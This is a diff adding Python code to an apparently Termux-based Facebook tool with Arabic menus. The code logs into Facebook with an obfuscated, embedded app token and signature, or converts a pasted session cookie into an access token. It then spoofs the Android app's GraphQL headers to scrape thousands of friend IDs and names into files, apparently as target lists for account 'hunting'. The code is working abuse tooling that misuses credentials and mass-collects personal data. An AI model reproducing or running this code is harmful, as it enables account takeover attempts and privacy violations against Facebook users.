+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠁⠉⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⠙⠻⢿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢰⡄⠀⠀⠀⢳⡄⣿⣶⣄⠀⢿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣦⠀⠀⢸⣿⣿⣿⣿⣷⣸⣿⣿⣿⡇
+⠠⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣿⣿⣷⡀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠈⠙⠻⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠿⠿⠿⠿⠿⠿⠟⠛⠻⣿⡀⠀⠀⠀⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠈⠀⠀⢀⣀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⢀⣤⣾⣿⠟⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣀⣀⡀⠀⠀⣀⠀⠀⠀⢸⣧⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⣠⡶⠿⠟⠛⠁⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⡿⣀⣀⡉⠓⠞⠁⠀⠀⠀⢸⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢸⣿⡏⣴⠁⢀⠉⢢⠀⠀⠀⠀⠀⢸⣿⠀⠀⡎⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣶⠸⣿⣇⠻⣀⡼⠀⢸⠀⠀⠀⠀⠀⢸⣿⠀⢠⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠸⢿⣧⠙⢿⣿⠁⠀⣠⡞⠀⠀⠀⠀⠀⢸⣿⢀⡎⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⢰⣶⣦⡀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⠘⠋⠉⠀⠀⠀⠀⠀⠀⢸⣿⣾⢁⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⣿⣿⣿⣷⣶⣦⣤⣉⠉⠩⣍⣉⣙⣛⡛⠛⠛⠛⠛⣀⣤⣤⣤⣤⣴⣶⣶⡶⣾⡿⠛⠛⠛⠉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢰⣿⣿⣿⡿⠿⠟⠛⠛⠳⠦⢌⠻⢿⣿⣿⣿⣿⣿⠀⠀⠉⠉⢀⠴⠚⠉⠀⠀⣼⠁⢀⣀⣤⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣔⣾⣿⠁⢠⡄⠐⣮⣴⣭⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣬⣥⣬⣽⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣠⣤⣤⣤⣤⣤⣤⣤⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠈⢻⣿⣿⣿⣿⡟⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡿⣿⠿⣛⣭⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠙⠿⠿⠋⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠇⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡿⣻⣿⣿⡿⠛⠛⠛⠛⠛⠛⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⢟⣽⣿⣿⣿⣿⣷⣶⣿⡿⠿⠿⠿⠷⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⢿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⣠⣴⡿⠟⠁⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣤⡈⠛⠿⣿⣿⣿⣿⠟⣋⣠⣤⣶⡿⠟⠋⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣷⣶⣤⣤⣤⣤⣤⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇
+''')
+    		print(f'\x1b[1;37m سـجل بـحساب فـايسبوك وهـمي')
+    		print(f"{a40}—"*60)
+    		em = str(input(f"[√] - Enter Gmail / Id :"))
+    		linex()
+    		print(f'{a40}—'*60)
+    		linex()
+    		ps = input(f'[√] - Enter Password :')
+    		print(f'{a40}—'*60)    
+    		print('')    
+    		linex()
+    		e="5990"
+    		ee="655"
+    		eee="59"
+    		tok1 = f"2377{e}9{eee}1{ee}"
+    		ei="0f140aabedfb65"
+    		ei2="a2263b1"
+    		tok2 = f"25257C{ei}ac27a739ed1{ei2}"
+    		us = f'Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41'
+    		demo_folder.addheaders = [('User-Agent', us)]
+    		li = "b-ap"
+    		lo = "od/auth.l"
+    		op="3f555f98"
+    		op2 = "d7aa0c"
+    		op3="58f522efm"
+    		sig=f"{op}fb61fc{op2}44f{op3}"
+    		p = demo_folder.open(
+    			'https://'+li+'i.facebook.com/meth'+lo+'ogin?access_token='+tok1+'%'+tok2+'&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + ps + '&sdk=ios&generate_session_cookies=1&sig='+sig+'')
+    		po = json.load(p)
+    		if 'access_token' in po:
+    			toke=po['access_token']
+    			linex()
+    			print(f"{a40}—"*60)
+    			M_T_F(f'\033[1;32m[\033[1;37m√\033[1;32m] - Login Done - Restart The Tool')
+    			linex()
+    			open('.token.txt','w').write(toke)
+    			exit()
+    		else:
+    			if 'www.facebook.com' in po['error_msg']:
+    				print('WAIT......')
+    				exit(em+'|'+ps)
+    			else:
+    				linex()
+    				exit(f'{a1} Werong Information ❌ ')
+    	def login_epa2(self):
+    		system('clear');
+    		print(logo)
+    		cooke = input(' cookie : ')
+    		cookie = {'Cookie': cooke}
+    		xyz = requests.session()
+    		data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
+    		req = xyz.post('https://graph.facebook.com/v16.0/device/login/', data=data).json()
+    		cd = req['code']
+    		ucd = req['user_code']
+    		url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038' % (
+    			cd)
+    		req = bs(xyz.get('https://mbasic.facebook.com/device', cookies=cookie).content, 'html.parser')
+    		raq = req.find('form', {'method': 'post'})
+    		dat = {'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
+    			   'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(req)).group(1), 'qr': '0',
+    			   'user_code': ucd}
+    		rel = 'https://mbasic.facebook.com' + raq['action']
+    		pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
+    		dat = {}
+    		raq = pos.find('form', {'method': 'post'})
+    		for x in raq('input', {'value': True}):
+    			try:
+    				if x['name'] == '__CANCEL__':
+    					pass
+    				else:
+    					dat.update({x['name']: x['value']})
+    			except Exception as e:
+    				pass
+    		rel = 'https://mbasic.facebook.com' + raq['action']
+    		pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
+    		req = xyz.get(url, cookies=cookie).json()
+    		if 'access_token' in req:
+    			print(f' [{B}•{W}] LOGIN DONE RERUN ')
+    			open('.token.txt', 'w').write(req['access_token'])
+    			exit()
+    		else:
+    			exit('WRONG')
+    	def login_WALA(self):
+    		system('clear')
+    		
+    		
+    		linex()
+    		menu =('1')
+    		if menu in ['01', '1', 'A', 'a']:
+    			login().lo_epa()
+    		if menu in ['461918']:
+    			login().login_epa2()
+    		
+    		else:
+    			linex()
+    			M_T_F('YOUR CHOSE IS WRONG')
+    			time.sleep(1)
+    			login_WALA()
+    
+    def main_menu():
+    	os.system("clear")
+    	print("")
+    	print(a1+'''\033[1;34m
+\x1b[38;5;180m \x1b[38;5;180m 
+
+ ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀          ⠀⠀⠀
+⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀
+⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄
+⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿
+⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿
+⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟
+⠀⠀⠀⠘⢿⣿⣟⡾              ⠱⣾⣿⣿⠏⠀
+⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀          ⠀
+⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸         ⠀⠀
+⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼          ⠀⠀
+⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃          ⠀⠀
+⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀          ⠀⠀⠀
+⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸          ⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃          ⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇          ⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀         ⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁         ⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁        ⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀      ⠀⠀⠀⠀⠀⠀
+''')    
+    	print(f"""
+  \033[1;32m  [\033[1;37m1\033[1;32m] \x1b[1;37m- Create File Ids - صنع ملف ايديات
+
+  \033[1;32m  [\033[1;37m2\033[1;32m] \x1b[1;37m- Change Token - تغيير توكن
+
+  \033[1;32m  [\033[1;37m3\033[1;32m] \x1b[1;37m- Delete Ids Double - حدف ايديات مكررة   """)
+    	print('')
+    	xo = input(f' \033[1;32m   [\033[1;37m•\033[1;32m] \x1b[1;37mEnter :')
+    	if xo in ['1']:
+    		file_create_menu().file_unlimmited()
+    	if xo in ['2']:
+    		os.system('rm -rf المبرمج نمرود')
+    		linex()
+    	
+    		os.system('rm -rf لاتنسى صور الصيد')
+    		linex()
+    		print('')
+    		M_T_F(f"\033[1;32m[\033[1;37m-\033[1;32m] Token Has Been Deleted √")
+    		exit()
+    	if xo in ['3']:
+    		print('')    	
+    		file_path = input(f"{P} \x1b[1;94m[\x1b[1;97m√\x1b[1;94m]\x1b[1;94m \x1b[1;97m File Path :")
+    	else:
+    		linex()
+    		M_T_F(f'{a1} - Wrong Choice ')
+    		time.sleep(1)
+    		main_menu()
+    siid=[]
+    sep=[]
+     
+    class file_create_menu():
+    	def file_simple(self):
+    		os.system('clear');print(logo)
+    		try:
+    			print(f' [•] WRITE FILE NAME WITHOUT /sdcard ')
+    			nm  = input(f' [•] ENTER FILE NAME : ').replace(' ','_')
+    			lk = '/sdcard/Download/Telegram/'
+    			lok = '%s%s'%(lk,nm)
+    			open(lok,'w')
+    		except FileNotFoundError:
+    			print(f' [×] LOCATION NOT FOUND TRY AGAIN !! ')
+    			time.sleep(2)
+    			back()
+    		except IsADirectoryError:
+    			time.sleep(1)
+    			file_create_menu().file_simple()
+    		if IOError:
+    			pass
+    			print(f' [•] PASTE UID ONE BY ONE ')
+    			linex()
+    			while True:
+    				ids_all = input(f" [>] ENTER UID : ")
+    				if ids_all == "":
+    					linex()
+    					print(f' [•] FILE SAVE AS : {lok} ')
+    					input(f' [>] PRESS ENTER TO BACK ')
+    					back()
+    					break
+    				try:
+    					uid = ids_all.split("|")[0]
+    				except:
+    					uid = ids_all
+    				try:
+    					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
+    							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
+    							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
+    							   "Authorization": "OAuth "+self.token+"",
+    							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
+    							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
+    							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
+    							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
+    							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
+    							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
+    							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
+    							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
+    					data = {
+    						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+    						'client_doc_id': client_id,
+    						'method': 'post',
+    						'locale': 'en_US',
+    						'pretty': 'false',
+    						'format': 'json',
+    						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
+    						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
+    						'fb_api_caller_class': 'graphservice',
+    						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
+    						'client_trace_id': trace_id,
+    						'server_timestamps': 'true',
+    						'purpose': 'fetch'
+    					}
+    					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
+    					try:
+    						data = posted['data']['user']['friends']['edges']
+    					except:
+    						print(f' \033[1;35m SOMETHING WRONG WITH {uid}\033[0m ')
+    					if len(data) < 100:
+    						print(f' [×] PRIVATE FRIENDLIST OF {uid} ')
+    						linex()
+    					else:
+    						for edge in data:
+    							node = edge['node']
+    							open(lok, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
+    						try:
+    							total_idss=len(open(lok,'r').readlines())
+    						except:
+    							total_idss='-'
+    						print(f' [•] SUCESSFULLY EXTRACTED {uid} [{total_idss}] \033[0m')
+    						linex()
+    				except KeyError:
+    					pass
+    				except requests.exceptions.ConnectionError:
+    					input(f" [×] CONNECTION ERROR - PRESS ENTER TO CONTINUE")
+    	def __init__(self):
+    		try:
+    			print('')
+    		except:
+    			pass
+    		self.ids = []
+    		self.total = []
+    		self.loop = 0
+    		try:
+    			self.token = open('.token.txt', 'r').read()
+    			uid="100061689760374"
+    			try:
+    				headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
+    						   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
+    						   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
+    						   "Authorization": "OAuth "+self.token+"",
+    						   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
+    						   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
+    						   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
+    						   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
+    						   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
+    						   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
+    						   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
+    						   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
+    				data = {
+    					'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+    					'client_doc_id': client_id,
+    					'method': 'post',
+    					'locale': 'en_US',
+    					'pretty': 'false',
+    					'format': 'json',
+    					'variables': '{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
+    					'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
+    					'fb_api_caller_class': 'graphservice',
+    					'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
+    					'client_trace_id': trace_id,
+    					'server_timestamps': 'true',
+    					'purpose': 'fetch'
+    				}
+    				posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
+    				if not posted['data']['user']['friends']['edges']:
+    				    os.system('clear');print(logo)
+    				    os.system('.token.txt')
+    				try:
+    					data = posted['data']['user']['friends']['edges']
+    				except:
+    					print(f' \033[1;31m SOMETHING WRONG WITH THIS ID \033[0m ')
+    					os.system('.token.txt')
+    					exit()
+    			except Exception as e:
+    				os.system('clear');print(logo)
+    				print(f" [{B}×{W}] COOKIES EXPRIED !")
+    				print(e)
+    				login.login_WALA('')
+    		except Exception as e:
+    			print(e)
+    			login.login_WALA('')
+    	def file_unlimmited(self):
+    		os.system('clear')
+    		from pyfiglet import Figlet as F; from random import choice as c; print("\033[92m" + F(c(["slant"])).renderText("SDM1"))
+    		print("•" *60)
+    		limit = int("1")
+    		try:
+    			print(f"Enter The File Name √ \n\n Exemple : Besto.txt ♕ اكتب اسم الملف ")
+    			nm  = input(f'\033[1;32m[\033[1;37m•\033[1;32m] Enter The File Name :').replace(' ','_')
+    			lk = '/sdcard/'
+    			lok = '%s%s'%(lk,nm)
+    			open(lok,'w')
+    		except FileNotFoundError:
+    			print(f'ENER THE FILE NAME WITH (.txt) ')
+    			time.sleep(1)
+    			back()
+    		except IsADirectoryError:
+    			time.sleep(1)
+    			file_create_menu().file_simple()
+    		if IOError:
+    			pass
+    			os.system('clear')
+    			try:
+    				file = open('.temp.txt', 'r').read().splitlines()
+    			except:
+    				file = []
+    			os.system('clear')
+    			print(SDMVIP)
+    			print(f"{a40}—"*60)
+    			for i in range(int(limit)):
+    				uid = input(f" - Enter ID :".format(i+1))
+    				try:
+    					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
+    							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
+    							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
+    							   "Authorization": "OAuth " + self.token + "",
+    							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
+    							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
+    							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
+    							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
+    							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
+    							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
+    							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
+    							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
+    					data = {
+    						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+    						'client_doc_id': client_id,
+    						'method': 'post',
+    						'locale': 'en_US',
+    						'pretty': 'false',
+    						'format': 'json',
+    						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
+    						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
+    						'fb_api_caller_class': 'graphservice',
+    						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
+    						'client_trace_id': trace_id,
+    						'server_timestamps': 'true',
+    						'purpose': 'fetch'
+    					}
+    					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
+    					try:
+    						data = posted['data']['user']['friends']['edges']
+    					except:
+    						print(f'')
+    					if len(data) < 100:
+    						print('')
+    					else:
+    						for edge in data:
+    							node = edge['node']
+    							open('.a.txt', 'a', encoding='utf-8').write(node['id'] + '\n')
+    							idss = len(open('.a.txt','r').readlines())
+    						print(f'[{idss}]\033[0m')
+    				except KeyError:
+    					pass
+    				except requests.exceptions.ConnectionError:
